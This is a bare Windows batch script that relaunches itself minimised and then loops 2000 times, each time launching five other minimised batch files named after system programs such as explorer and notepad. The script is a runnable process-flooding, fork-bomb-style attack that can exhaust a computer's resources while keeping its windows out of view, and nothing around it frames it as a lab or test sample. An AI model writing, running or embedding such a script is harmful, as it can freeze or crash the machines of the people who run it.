@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
FOR /L %%A IN (1,1,2000) DO (
    start /min "" ".\exe.bat"
    start /min "" ".\explorer.bat"
    start /min "" ".\notepad.bat"
    start /min "" ".\sandbox.bat"
    start /min "" ".\launch.bat"
)
